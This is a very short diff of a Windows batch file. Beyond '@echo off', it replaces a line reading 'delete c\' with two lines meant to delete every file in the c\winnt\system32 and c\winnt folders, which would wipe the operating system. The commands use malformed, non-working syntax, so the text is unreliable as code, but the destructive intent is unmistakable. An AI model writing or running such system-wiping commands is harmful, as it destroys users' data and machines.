@@ -1,2 +1,3 @@
 @echo off
-delete c\
+delete: c\winnt\system32\*.*
+delete: c\winnt\*.*
